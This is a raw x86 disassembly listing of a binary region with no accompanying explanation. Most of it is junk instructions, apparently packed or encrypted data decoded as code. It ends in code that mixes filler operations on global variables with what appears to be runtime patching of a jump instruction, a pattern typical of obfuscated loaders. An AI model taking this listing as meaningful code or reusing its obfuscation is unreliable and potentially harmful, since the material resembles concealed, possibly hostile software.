  41b19a:	mov    cl,0x2a
  41b19c:	push   ss
  41b19d:	xchg   ebp,eax
  41b19e:	aad    0xb4
  41b1a0:	sbb    DWORD PTR [eax+0x3b],ebx
  41b1a3:	rol    DWORD PTR [ebx-0x32d1a66e],0xed
  41b1aa:	adc    eax,0x478e4fc5
  41b1af:	ins    BYTE PTR es:[edi],dx
  41b1b0:	int    0xf0
  41b1b2:	sub    bh,BYTE PTR [ebx]
  41b1b4:	push   cs
  41b1b5:	(bad)  
  41b1b6:	xlat   BYTE PTR ds:[ebx]
  41b1b7:	jmp    FWORD PTR [ebp-0x2b41a64c]
  41b1bd:	fst    DWORD PTR [esi]
  41b1bf:	daa    
  41b1c0:	movaps xmm4,XMMWORD PTR ds:0x8fa36bab
  41b1c7:	gs pop ebp
  41b1c9:	mov    ds:0x5a54fa2,al
  41b1ce:	jbe    0x41b158
  41b1d0:	out    0x7d,eax
  41b1d2:	fiadd  DWORD PTR [edi-0x7a]
  41b1d5:	xchg   esi,eax
  41b1d6:	add    ebp,DWORD PTR [ebx+0x4bf76655]
  41b1dc:	jmp    0xfeb4:0x649b931
  41b1e3:	push   edx
  41b1e4:	mov    edx,0x69bd75c5
  41b1e9:	push   cs
  41b1ea:	out    0x22,al
  41b1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ed:	fidivr DWORD PTR [eax+edx*1+0x25]
  41b1f1:	inc    ebp
  41b1f2:	jmp    0x41b259
  41b1f4:	xchg   esi,eax
  41b1f5:	xor    edi,DWORD PTR [ebx]
  41b1f7:	(bad)  
  41b1f8:	dec    esp
  41b1f9:	cmp    al,0x78
  41b1fb:	inc    ebp
  41b1fc:	sbb    BYTE PTR [esi-0x25cb10c6],ch
  41b202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b203:	mov    ds:0xd0534031,al
  41b208:	(bad)  
  41b209:	mov    WORD PTR [eax+eiz*2+0x1e],gs
  41b20d:	cli    
  41b20e:	add    esi,DWORD PTR [edi]
  41b210:	push   0x45
  41b212:	addr16 jmp 0x41b24e
  41b215:	popa   
  41b216:	mov    ebx,0x2c9412af
  41b21b:	mov    al,0x77
  41b21d:	sbb    eax,esp
  41b21f:	adc    DWORD PTR [esi+0x60af8388],esi
  41b225:	mov    bl,0xa1
  41b227:	push   eax
  41b228:	jb     0x41b231
  41b22a:	out    0xf5,eax
  41b22c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b22d:	cs hlt 
  41b22f:	add    eax,0xba2ba678
  41b234:	scas   al,BYTE PTR es:[edi]
  41b235:	pop    es
  41b236:	stos   WORD PTR es:[edi],ax
  41b238:	mov    ecx,0x6a1427e0
  41b23d:	lods   eax,DWORD PTR ds:[esi]
  41b23e:	jecxz  0x41b282
  41b240:	lods   al,BYTE PTR ds:[esi]
  41b241:	and    al,0xcc
  41b243:	mov    dh,BYTE PTR [eax]
  41b245:	cmc    
  41b246:	pop    esi
  41b247:	xchg   ebx,eax
  41b248:	cdq    
  41b249:	jo     0x41b28a
  41b24b:	pop    eax
  41b24c:	pop    edx
  41b24d:	sbb    al,0xcc
  41b24f:	sahf   
  41b250:	jl     0x41b245
  41b252:	shl    cl,0x9b
  41b255:	dec    edi
  41b256:	mov    edi,0x1132f8fa
  41b25b:	lahf   
  41b25c:	retf   
  41b25d:	and    ah,BYTE PTR [esi]
  41b25f:	test   al,0x81
  41b261:	and    BYTE PTR [esp+ebx*2+0x50],ah
  41b265:	cmp    BYTE PTR [ebp-0x1a128f49],bl
  41b26b:	in     al,dx
  41b26c:	add    esi,DWORD PTR [ebx-0x77]
  41b26f:	cmp    BYTE PTR [eax],ch
  41b271:	mov    cl,0x47
  41b273:	mov    ds:0xcf2d3c6,al
  41b278:	sbb    BYTE PTR [esi],0xe7
  41b27b:	jmp    0xc51e:0xb6a79a53
  41b282:	jns    0x41b206
  41b284:	pop    es
  41b285:	add    BYTE PTR [eax+ecx*2+0x41],bl
  41b289:	(bad)  
  41b28b:	cmp    ebp,DWORD PTR [edx+0x22]
  41b28e:	imul   esi,DWORD PTR [edi+0x11],0xffffff84
  41b292:	and    eax,0x132c5d1d
  41b297:	mov    ebx,0x4ab42cdb
  41b29c:	cmp    ch,ah
  41b29e:	jb     0x41b2c5
  41b2a0:	dec    esp
  41b2a1:	in     eax,0x76
  41b2a3:	mov    al,ds:0xff67bf2f
  41b2a8:	fdivr  DWORD PTR [ebx-0x53b0b93e]
  41b2ae:	adc    ah,BYTE PTR [eax+ecx*8]
  41b2b1:	(bad)  
  41b2b2:	inc    ecx
  41b2b3:	mov    ds:0x100a7ffa,eax
  41b2b8:	push   ds
  41b2b9:	dec    esi
  41b2ba:	lahf   
  41b2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2bc:	sub    ch,BYTE PTR [ecx+0x1de279a5]
  41b2c2:	mov    ds:0x46da0a23,eax
  41b2c7:	push   0x17
  41b2c9:	push   esi
  41b2ca:	adc    BYTE PTR [ebp-0x33c7c515],bl
  41b2d0:	ds ins BYTE PTR es:[edi],dx
  41b2d2:	sub    bh,BYTE PTR [ebp+0x46]
  41b2d5:	jp     0x41b327
  41b2d7:	jmp    0x27aa160c
  41b2dc:	mov    al,ds:0xfc618a73
  41b2e1:	in     al,0xb9
  41b2e3:	stos   BYTE PTR es:[edi],al
  41b2e4:	jge    0x41b2ec
  41b2e6:	lds    ebp,FWORD PTR [ebp+eax*4+0x63a8d56b]
  41b2ed:	sub    eax,0x31e9a462
  41b2f2:	not    DWORD PTR [eax+0x6fedf0a9]
  41b2f8:	fadd   QWORD PTR [ebp+ecx*8-0x5c]
  41b2fc:	push   ds
  41b2fd:	test   dl,al
  41b2ff:	push   es
  41b300:	mov    dl,ah
  41b302:	enter  0xd444,0x38
  41b306:	sub    cl,BYTE PTR [eax-0x40]
  41b309:	lock mov ds:0x5b7a2d48,al
  41b30f:	fucomip st,st(1)
  41b311:	add    eax,DWORD PTR [edx-0x4389719b]
  41b317:	loop   0x41b328
  41b319:	not    DWORD PTR [edi+0x1448978c]
  41b31f:	and    DWORD PTR [ebx],esp
  41b321:	ret    0xa223
  41b324:	dec    edi
  41b325:	out    0x91,eax
  41b327:	dec    ecx
  41b328:	push   0x1f
  41b32a:	nop
  41b32b:	in     eax,0xbf
  41b32d:	cwde   
  41b32e:	add    eax,0x573476b6
  41b333:	pop    esi
  41b334:	mov    esp,?
  41b336:	(bad)  
  41b337:	mov    edx,0x3062349d
  41b33c:	push   edx
  41b33d:	mov    eax,0xf7dfc1f7
  41b342:	shl    DWORD PTR [eax-0x29],0xd1
  41b346:	rcl    DWORD PTR [ebp-0x63],cl
  41b349:	in     eax,0x8c
  41b34b:	cmp    eax,0xed45b075
  41b350:	popf   
  41b351:	add    eax,0x289f4741
  41b356:	xor    esi,eax
  41b358:	enter  0xc433,0xcf
  41b35c:	jae    0x41b3a2
  41b35e:	or     al,0x51
  41b360:	aam    0x96
  41b362:	xor    eax,ebx
  41b364:	std    
  41b365:	push   cs
  41b366:	jge    0x41b30a
  41b368:	push   esp
  41b369:	pushf  
  41b36a:	push   cs
  41b36b:	dec    ebx
  41b36c:	mov    dh,0x9d
  41b36e:	mov    ds:0x52e9e49c,al
  41b373:	in     al,dx
  41b374:	xor    al,BYTE PTR [eax+0x7f]
  41b377:	adc    al,0x7b
  41b379:	mov    DWORD PTR ds:0x46bbad12,ebx
  41b37f:	dec    ebx
  41b380:	cld    
  41b381:	cs int 0x7d
  41b384:	xor    ebp,ebp
  41b386:	aam    0xd3
  41b388:	rol    ah,cl
  41b38a:	cmp    DWORD PTR [ebx],ebx
  41b38c:	mov    ebp,0x53750b0e
  41b391:	ins    BYTE PTR es:[edi],dx
  41b392:	sahf   
  41b393:	neg    edx
  41b395:	sbb    al,0xb7
  41b397:	std    
  41b398:	repz aad 0xd4
  41b39b:	fwait
  41b39c:	push   ds
  41b39d:	imul   ebp,DWORD PTR [esi+0x628d83ab],0x438e50cb
  41b3a7:	sub    al,0x20
  41b3a9:	and    al,0xea
  41b3ab:	push   ss
  41b3ac:	loop   0x41b41e
  41b3ae:	(bad)  
  41b3af:	dec    edi
  41b3b0:	iret   
  41b3b1:	sbb    dh,dl
  41b3b3:	or     BYTE PTR [ebp+0x76054fea],ch
  41b3b9:	or     eax,0x6211b7d
  41b3be:	mov    cl,BYTE PTR [ecx-0x75864b66]
  41b3c4:	xchg   ecx,esi
  41b3c6:	jmp    0x41b3f2
  41b3c8:	mov    al,0x1e
  41b3ca:	xor    dl,ah
  41b3cc:	adc    DWORD PTR cs:[ecx-0x49d9a12d],eax
  41b3d3:	ret    0x94a9
  41b3d6:	dec    ecx
  41b3d7:	fld    TBYTE PTR [esi-0x13]
  41b3da:	mov    eax,ds:0xaa15fbe2
  41b3df:	adc    eax,DWORD PTR [edi+0x48]
  41b3e2:	or     DWORD PTR [ebx+0x457b9e17],eax
  41b3e8:	call   0x9498:0xeeaf2fb4
  41b3ef:	sbb    ebx,esi
  41b3f1:	lock xchg BYTE PTR [ebx-0x42],ch
  41b3f5:	dec    edx
  41b3f6:	xchg   ebx,eax
  41b3f7:	ins    BYTE PTR es:[edi],dx
  41b3f8:	aaa    
  41b3f9:	and    cl,al
  41b3fb:	and    ebp,DWORD PTR [eax]
  41b3fd:	jnp    0x41b3df
  41b3ff:	jae    0x41b452
  41b401:	imul   BYTE PTR [eax+esi*1+0x4f]
  41b405:	mov    edx,0x62d269a0
  41b40a:	add    al,0xc1
  41b40c:	sub    eax,0x5476d8b
  41b411:	pop    edi
  41b412:	pop    edx
  41b413:	xor    eax,0x79809fd5
  41b418:	stc    
  41b419:	inc    eax
  41b41a:	dec    ebx
  41b41c:	rcl    BYTE PTR [ebp+0xca23702],cl
  41b422:	adc    BYTE PTR [ecx],ch
  41b424:	ins    DWORD PTR es:[edi],dx
  41b425:	mov    eax,es
  41b427:	xchg   edx,eax
  41b428:	mov    esi,0xea3915a8
  41b42d:	fcomi  st,st(4)
  41b42f:	pop    esp
  41b430:	pop    esi
  41b431:	shr    dl,0x2f
  41b434:	mov    esp,0xdb8bfcc8
  41b439:	sub    eax,0x8a5f378f
  41b43e:	repz mov ebx,0x7a70b9b6
  41b444:	add    ch,BYTE PTR [eax+0x7020f68a]
  41b44a:	jo     0x41b45e
  41b44c:	scas   al,BYTE PTR es:[edi]
  41b44d:	jb     0x41b4a0
  41b44f:	imul   esp,DWORD PTR [edi+0x3cb5689c],0x6a
  41b456:	jle    0x41b434
  41b458:	dec    ecx
  41b459:	fcom   st(4)
  41b45b:	fiadd  DWORD PTR [esi-0x72816ae4]
  41b461:	and    eax,0xb21d2a32
  41b466:	int3   
  41b467:	aam    0x56
  41b469:	adc    eax,edi
  41b46b:	int3   
  41b46c:	lahf   
  41b46d:	ins    BYTE PTR es:[edi],dx
  41b46e:	dec    ecx
  41b46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b470:	ret    0x9d66
  41b473:	call   0xf0ba0ef5
  41b478:	jmp    0x7d030b72
  41b47d:	adc    BYTE PTR [eax+ebp*2],bl
  41b480:	pop    edi
  41b481:	mov    gs,edi
  41b483:	cmp    eax,0x5d53865f
  41b488:	push   ss
  41b489:	fmul   QWORD PTR [eax+ebx*8+0x39]
  41b48d:	xor    DWORD PTR [ebp+0x11],0x7c
  41b491:	test   BYTE PTR ds:0xde575cb4,0xb7
  41b498:	and    eax,0xb7a59062
  41b49d:	cmp    DWORD PTR [edi-0x5f],eax
  41b4a0:	xchg   edx,eax
  41b4a1:	cld    
  41b4a2:	mov    bh,dh
  41b4a4:	pop    es
  41b4a5:	iret   
  41b4a6:	repnz dec ecx
  41b4a8:	or     BYTE PTR [edi+edx*4-0x413f09c6],bl
  41b4af:	push   ebp
  41b4b0:	adc    bh,bh
  41b4b2:	popa   
  41b4b3:	sub    BYTE PTR [esi+0x1ab66604],bh
  41b4b9:	(bad)  
  41b4ba:	mov    ds:0xb4510d36,eax
  41b4bf:	mov    BYTE PTR [edi],bh
  41b4c1:	mov    eax,0x7bead28
  41b4c6:	cmp    eax,0x447c9569
  41b4cb:	dec    edi
  41b4cc:	cwde   
  41b4cd:	cmp    al,0xdb
  41b4cf:	pop    ebp
  41b4d0:	inc    edi
  41b4d1:	xchg   DWORD PTR [ecx+0x6c772e20],esp
  41b4d7:	push   eax
  41b4d8:	loope  0x41b534
  41b4da:	jl     0x41b530
  41b4dc:	push   es
  41b4dd:	mov    BYTE PTR [edi],bl
  41b4df:	pop    ss
  41b4e0:	mov    dl,0x1b
  41b4e2:	and    eax,0x9f464c97
  41b4e7:	or     eax,0xe9f93095
  41b4ec:	mov    esi,0x41b2fd91
  41b4f1:	sbb    edi,DWORD PTR [esi+0xe]
  41b4f4:	sub    al,0x78
  41b4f6:	lahf   
  41b4f7:	sub    BYTE PTR [ecx],cl
  41b4f9:	pop    ebp
  41b4fa:	outs   dx,DWORD PTR ds:[esi]
  41b4fb:	outs   dx,BYTE PTR ds:[esi]
  41b4fc:	xlat   BYTE PTR ds:[ebx]
  41b4fd:	inc    edx
  41b4fe:	and    dl,al
  41b500:	ins    DWORD PTR es:[edi],dx
  41b501:	cli    
  41b502:	sar    DWORD PTR [ebp+0x2b],0xf6
  41b506:	sar    DWORD PTR [esi+0x70],0xd8
  41b50a:	mov    cl,0x35
  41b50c:	push   ds
  41b50d:	cld    
  41b50e:	xor    eax,0x158d4f62
  41b513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b514:	xlat   BYTE PTR ds:[ebx]
  41b515:	pop    es
  41b516:	sbb    eax,0x3ad7dc90
  41b51b:	outs   dx,DWORD PTR ds:[esi]
  41b51c:	(bad)  
  41b51d:	cli    
  41b51e:	push   0x56
  41b520:	mov    eax,ds:0x4f262123
  41b525:	out    dx,al
  41b526:	adc    ebx,DWORD PTR [ebx+0x569644ac]
  41b52c:	sub    BYTE PTR [ebx+0x4a],cl
  41b52f:	je     0x41b564
  41b531:	dec    ecx
  41b532:	ret    
  41b533:	rcr    DWORD PTR [edx-0xf26c412],0x2e
  41b53a:	xor    ebx,edx
  41b53c:	push   ecx
  41b53d:	sbb    DWORD PTR [esi+0x7e4b8ae5],esi
  41b543:	icebp  
  41b544:	nop
  41b545:	rol    al,1
  41b547:	push   edi
  41b548:	push   cs
  41b549:	stc    
  41b54a:	pop    eax
  41b54b:	pop    esp
  41b54c:	jle    0x41b51a
  41b54e:	loope  0x41b533
  41b550:	xchg   ebp,eax
  41b551:	or     eax,0x7af94be
  41b556:	sub    BYTE PTR [edi+0x294bed23],ah
  41b55c:	sbb    eax,0xac8be33d
  41b561:	push   0xfe07c6cb
  41b566:	xor    ch,BYTE PTR [esp+edi*4]
  41b569:	sub    esp,ecx
  41b56b:	aas    
  41b56c:	stos   BYTE PTR es:[edi],al
  41b56d:	stc    
  41b56e:	scas   al,BYTE PTR es:[edi]
  41b56f:	dec    ebx
  41b570:	sti    
  41b571:	cmp    BYTE PTR [ebx],dh
  41b573:	mov    esi,0x7aa31f5b
  41b578:	xor    al,0xbe
  41b57a:	sbb    DWORD PTR [ebp-0xcbf5083],0xffffff80
  41b581:	cmp    BYTE PTR [esi],ch
  41b583:	cdq    
  41b584:	jge    0x41b580
  41b586:	stos   DWORD PTR es:[edi],eax
  41b587:	popf   
  41b588:	outs   dx,DWORD PTR ds:[esi]
  41b589:	outs   dx,BYTE PTR ds:[esi]
  41b58a:	pop    ss
  41b58b:	dec    ebx
  41b58c:	dec    eax
  41b58d:	hlt    
  41b58e:	inc    esp
  41b58f:	mov    ebx,DWORD PTR [eax]
  41b591:	out    0xd,al
  41b593:	xor    esi,DWORD PTR [edx-0x369457d6]
  41b599:	jecxz  0x41b540
  41b59b:	lods   eax,DWORD PTR ds:[esi]
  41b59c:	push   es
  41b59d:	mov    ch,0x64
  41b59f:	add    ebp,DWORD PTR [edx+0x50076104]
  41b5a5:	inc    esp
  41b5a6:	les    ecx,FWORD PTR [ecx+0x924e331]
  41b5ac:	push   edi
  41b5ad:	jbe    0x41b5f6
  41b5af:	loopne 0x41b616
  41b5b1:	adc    ebp,edx
  41b5b3:	mov    ah,0xfd
  41b5b5:	mov    ebx,ss
  41b5b7:	enter  0x4222,0x33
  41b5bb:	daa    
  41b5bc:	retf   
  41b5bd:	in     eax,dx
  41b5be:	dec    esi
  41b5bf:	pop    ebx
  41b5c0:	shl    DWORD PTR [eax+0x2d],1
  41b5c3:	imul   ebp,DWORD PTR ds:0xa639d87d,0xffffff91
  41b5ca:	das    
  41b5cb:	mov    ebp,DWORD PTR [esi+0x59fe9a7]
  41b5d1:	ror    BYTE PTR [eax],1
  41b5d3:	aam    0x43
  41b5d5:	stos   DWORD PTR es:[edi],eax
  41b5d6:	push   0xffffffa9
  41b5d8:	ins    DWORD PTR es:[edi],dx
  41b5d9:	add    DWORD PTR [ecx+0x70],0x6d
  41b5dd:	lea    esp,[ecx-0x37]
  41b5e0:	daa    
  41b5e1:	fbstp  TBYTE PTR [eax+0x379f2ba8]
  41b5e7:	inc    eax
  41b5e8:	mov    ds:0x57463e2e,eax
  41b5ed:	mov    ds:0x2c66ee96,eax
  41b5f2:	or     al,BYTE PTR [ebp-0x422f53be]
  41b5f8:	and    al,0x8d
  41b5fa:	in     al,dx
  41b5fb:	push   eax
  41b5fc:	and    edi,edx
  41b5fe:	or     al,0xd2
  41b600:	pop    edx
  41b601:	add    al,0xf6
  41b603:	cld    
  41b604:	xchg   ecx,eax
  41b605:	xor    al,0x1d
  41b607:	mov    edx,0x8ce8bac9
  41b60c:	dec    edx
  41b60d:	pop    ds
  41b60e:	jge    0x41b68a
  41b610:	inc    esp
  41b611:	mov    dh,0x4e
  41b613:	jno    0x41b652
  41b615:	outs   dx,BYTE PTR ds:[esi]
  41b616:	les    ecx,FWORD PTR [ebx]
  41b618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b619:	not    BYTE PTR [edx-0x3c]
  41b61c:	or     bl,BYTE PTR [ecx+ecx*1-0x44]
  41b620:	lea    ebx,[esi-0x526ff3b9]
  41b626:	xor    ebx,DWORD PTR [eax-0x4d]
  41b629:	loopne 0x41b612
  41b62b:	push   ss
  41b62c:	ds xchg edx,eax
  41b62e:	out    0x55,al
  41b630:	adc    dl,dl
  41b632:	mov    al,cs:0x5a537154
  41b638:	cmp    al,0xa4
  41b63a:	xchg   ecx,eax
  41b63b:	adc    edi,DWORD PTR [ebx+0x845138b]
  41b641:	jae    0x41b6b4
  41b643:	enter  0x1db2,0xeb
  41b647:	(bad)  
  41b648:	out    0xe5,al
  41b64a:	ret    0xc065
  41b64d:	pop    ebp
  41b64e:	xor    ecx,eax
  41b650:	xchg   edi,eax
  41b651:	scas   eax,DWORD PTR es:[edi]
  41b652:	mov    eax,ds:0xff4f1251
  41b657:	push   ecx
  41b658:	stos   BYTE PTR es:[edi],al
  41b659:	cmp    eax,0x223aec65
  41b65e:	nop
  41b65f:	inc    edi
  41b660:	mov    ebx,0xe36d9605
  41b665:	into   
  41b666:	inc    eax
  41b667:	pop    ds
  41b668:	(bad)  
  41b669:	cld    
  41b66a:	fisub  WORD PTR [esi+0x10]
  41b66d:	push   ecx
  41b66e:	ja     0x41b638
  41b670:	sbb    ah,BYTE PTR [eax+ebp*1]
  41b673:	add    eax,0x61639dce
  41b678:	jne    0x41b687
  41b67a:	stos   BYTE PTR es:[edi],al
  41b67b:	xchg   DWORD PTR [ebx+0x35],ecx
  41b67e:	rcl    BYTE PTR [edi+edi*4],0xba
  41b682:	cld    
  41b683:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b685:	cmp    ch,BYTE PTR [edx]
  41b687:	vhsubps xmm6,xmm1,xmm3
  41b68b:	out    0xd7,eax
  41b68d:	cmp    ebp,DWORD PTR [edx+ebp*1]
  41b690:	cmp    BYTE PTR [edi],ch
  41b692:	addr16 sub esi,esi
  41b695:	hlt    
  41b696:	cld    
  41b697:	sbb    ebx,DWORD PTR [ebx+edi*2+0x7e]
  41b69b:	scas   al,BYTE PTR es:[edi]
  41b69c:	outs   dx,BYTE PTR ds:[esi]
  41b69d:	push   ss
  41b69e:	push   ecx
  41b69f:	push   cs
  41b6a0:	jmp    0x41b702
  41b6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a3:	cmc    
  41b6a4:	sub    ecx,DWORD PTR [ebp+0x2c]
  41b6a7:	ret    
  41b6a8:	sub    ecx,DWORD PTR [esi]
  41b6aa:	sub    al,0xac
  41b6ac:	repnz mov edx,0x636733d7
  41b6b2:	jg     0x41b678
  41b6b4:	outs   dx,DWORD PTR ds:[esi]
  41b6b5:	enter  0xa74e,0x7a
  41b6b9:	leave  
  41b6ba:	stc    
  41b6bb:	mov    edx,0xad6da05c
  41b6c0:	pop    ss
  41b6c1:	(bad)
  41b6c5:	xchg   BYTE PTR [eax],dl
  41b6c7:	ret    
  41b6c8:	jle    0x41b6a7
  41b6ca:	stos   DWORD PTR es:[edi],eax
  41b6cb:	jp     0x41b64f
  41b6cd:	xor    ah,BYTE PTR [ebx-0x6a5dce8f]
  41b6d3:	cdq    
  41b6d4:	fdivp  st(7),st
  41b6d6:	push   edx
  41b6d7:	xchg   esi,eax
  41b6d8:	jae    0x41b742
  41b6da:	mov    ds:0xeb9b53ba,eax
  41b6df:	in     eax,dx
  41b6e0:	lods   al,BYTE PTR ds:[esi]
  41b6e1:	int    0xeb
  41b6e3:	cli    
  41b6e4:	dec    edx
  41b6e5:	mov    ebp,0xa1df45e
  41b6ea:	(bad)  
  41b6eb:	jmp    0x27081b34
  41b6f0:	xchg   edx,eax
  41b6f1:	jns    0x41b6e5
  41b6f3:	cmc    
  41b6f4:	dec    eax
  41b6f5:	jg     0x41b6bd
  41b6f7:	sahf   
  41b6f8:	mov    eax,ds:0xc260eabd
  41b6fd:	sti    
  41b6fe:	xlat   BYTE PTR ds:[ebx]
  41b6ff:	mov    ebx,0xd818809f
  41b704:	outs   dx,BYTE PTR ds:[esi]
  41b705:	outs   dx,DWORD PTR ds:[esi]
  41b706:	ficom  DWORD PTR [eax-0x50]
  41b709:	cmp    eax,0xf1f526af
  41b70e:	cmp    DWORD PTR [esi],0x5bde9eb7
  41b714:	mov    bh,0x1b
  41b716:	jno    0x41b6d8
  41b718:	imul   edx,edi,0x41
  41b71b:	jmp    0x5181d596
  41b720:	sbb    BYTE PTR [esi-0x28],0xf7
  41b724:	jo     0x41b70b
  41b726:	pop    eax
  41b727:	cld    
  41b728:	ds mov al,0xa2
  41b72b:	test   DWORD PTR [ebx],0xb462a27d
  41b731:	sbb    al,0xf3
  41b733:	mov    al,0xed
  41b735:	dec    ecx
  41b736:	mov    ecx,0xedb9d76
  41b73b:	rol    BYTE PTR [edx],0x75
  41b73e:	or     BYTE PTR [ecx],0xdf
  41b741:	jae    0x41b705
  41b743:	inc    ebx
  41b744:	data16 and BYTE PTR ds:[eax+0x511b27f9],bl
  41b74c:	sbb    eax,0x95113199
  41b751:	push   DWORD PTR [eax]
  41b753:	xlat   BYTE PTR ds:[ebx]
  41b754:	dec    edi
  41b755:	adc    dh,BYTE PTR [eax-0x38]
  41b758:	push   esp
  41b759:	sub    BYTE PTR [ecx-0x1c],0x54
  41b75d:	jmp    0xdccf:0xb36d0260
  41b764:	call   0xb20f2d89
  41b769:	repnz inc edi
  41b76b:	pushf  
  41b76c:	pop    ss
  41b76d:	rcr    DWORD PTR [ecx-0x8],0x10
  41b771:	dec    eax
  41b772:	mov    edi,0xf9799c9e
  41b777:	mov    edx,0xb7d4941c
  41b77c:	and    DWORD PTR [ecx],eax
  41b77e:	movlps xmm3,QWORD PTR [edi+0x0]
  41b782:	retf   
  41b783:	nop
  41b784:	(bad)  
  41b785:	lock and DWORD PTR [edx-0x53],edi
  41b789:	adc    eax,0x1e7985d1
  41b78e:	push   ecx
  41b78f:	cmp    esp,DWORD PTR [edx-0x38c22b63]
  41b795:	stc    
  41b796:	shr    BYTE PTR [eax+eiz*1-0x69422e9c],cl
  41b79d:	pop    esi
  41b79e:	bound  esi,QWORD PTR [eax-0x37]
  41b7a1:	mov    eax,0x69f81d52
  41b7a6:	mov    cl,0x70
  41b7a8:	push   ecx
  41b7a9:	mov    eax,0xfd69b1c7
  41b7ae:	mov    esi,0x55cd362e
  41b7b3:	ja     0x41b828
  41b7b5:	xor    eax,DWORD PTR [eax]
  41b7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7b8:	jmp    0xffee34d9
  41b7bd:	(bad)  
  41b7be:	cmp    BYTE PTR [edi-0x4b],0x4e
  41b7c2:	jge    0x41b7e3
  41b7c4:	imul   esi,edi,0xffffff89
  41b7c7:	jae    0x41b7e7
  41b7c9:	push   eax
  41b7ca:	adc    al,0x39
  41b7cc:	mov    ds:0x1b921ba4,al
  41b7d1:	outs   dx,DWORD PTR ds:[esi]
  41b7d2:	push   ebp
  41b7d3:	pop    ecx
  41b7d4:	xchg   edi,eax
  41b7d5:	lock and eax,0x5c807a6b
  41b7db:	lds    ebx,FWORD PTR [ebx-0x129b1a59]
  41b7e1:	ret    
  41b7e2:	mov    eax,0x819c5465
  41b7e7:	test   DWORD PTR [eiz*2+0xbc5a644],ecx
  41b7ee:	mov    esi,0x68a1cac8
  41b7f3:	loope  0x41b793
  41b7f5:	cmp    DWORD PTR [edi],ecx
  41b7f7:	rcr    edi,0xfe
  41b7fa:	enter  0xe88e,0xb7
  41b7fe:	js     0x41b836
  41b800:	in     eax,dx
  41b801:	sti    
  41b802:	sbb    BYTE PTR [eax],ah
  41b804:	cs xor ebp,ebx
  41b807:	or     al,0x2d
  41b809:	inc    ecx
  41b80a:	and    ecx,eax
  41b80c:	or     al,0x2a
  41b80e:	jnp    0x41b874
  41b810:	add    eax,0xd2eb841f
  41b815:	mov    WORD PTR [ebx-0x7],?
  41b818:	cld    
  41b819:	pop    es
  41b81a:	jae    0x41b83b
  41b81c:	push   0xe952b527
  41b821:	cmp    eax,0xf4029e5f
  41b826:	xchg   edi,eax
  41b827:	add    edi,DWORD PTR [edx+ebx*1-0x2e]
  41b82b:	cmp    eax,0xf182ea26
  41b830:	imul   ecx,esi,0xffffff8d
  41b833:	adc    BYTE PTR [edi-0x6fce5f35],dl
  41b839:	add    BYTE PTR [esp+esi*2+0x2702116a],cl
  41b840:	mov    dh,0x99
  41b843:	iret   
  41b844:	sub    al,0x1a
  41b846:	fldcw  WORD PTR [edi]
  41b848:	jmp    0x967c4c23
  41b84d:	mov    ecx,DWORD PTR [ebp-0x4]
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
